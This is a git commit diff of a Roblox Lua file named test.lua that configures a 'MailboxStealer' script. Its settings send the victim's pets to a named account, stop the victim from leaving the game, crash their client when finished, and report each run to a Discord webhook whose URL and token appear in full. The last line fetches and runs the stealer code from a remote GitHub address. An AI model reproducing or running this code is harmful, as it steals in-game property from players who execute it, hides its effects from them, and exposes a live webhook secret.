964150db66e30024ce29962c25bdf5095acc9382
HerrSimoNHub <130193268+HerrSimoNHub@users.noreply.github.com>
2023-04-08 03:33:11 +0200

    Update test.lua

--- test.lua
+++ test.lua
@@ -1,17 +1,22 @@
---// Main Config
-_G.Username = "HerrySzymoN"
-_G.AntiLeave = true
-_G.FullScreen = true
-_G.MuteRoblox = true
+--[[ Main Config ]]--
+_G.Username = "HerrySzymoN" --// Username To Send Pets To
+_G.GiftMessage = "SimoNHub" --// Message For The Gift To Say
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+_G.UnlockPets = true --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+_G.Crash = true  --// Crashes Them After Its Finished
 
---// Webhook Config
-_G.EnableWebhook = true
-_G.Webhook = "https://discord.com/api/webhooks/1093827767948288050/rx_kEjRnxLTNUmSrZgME13mMRdLPaeXyFjdhnCgArlXA-ASK9jo6ifUQUgo6iSXL_JBN"
+--[[ Webhook Config ]]--
+_G.Enabled = true --// Toggle For Sending Webhooks
+_G.Mention = false --// Pings You When Someone Executes
+_G.Webhook = "https://discord.com/api/webhooks/1093827767948288050/rx_kEjRnxLTNUmSrZgME13mMRdLPaeXyFjdhnCgArlXA-ASK9jo6ifUQUgo6iSXL_JBN" --// Discord Webhook For Executions
 
---// UI Config
-_G.ScriptName = "ez"
-_G.Tip1 = "ez"
-_G.Tip2 = "ez"
-_G.Tip3 = "ez"
+--[[ UI Config ]]--
+_G.ScriptName = "ez" --// Script Name On The UI
+_G.Tip1 = "ez" --// Gives You Tips On The UI
+_G.Tip2 = "ez" --// Gives You Tips On The UI
+_G.Tip3 = "ez" --// Gives You Tips On The UI
+_G.Tip4 = "ez" --// Gives You Tips On The UI
+_G.Tip5 = "ez" --// Gives You Tips On The UI
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/MailboxStealer.lua"))()
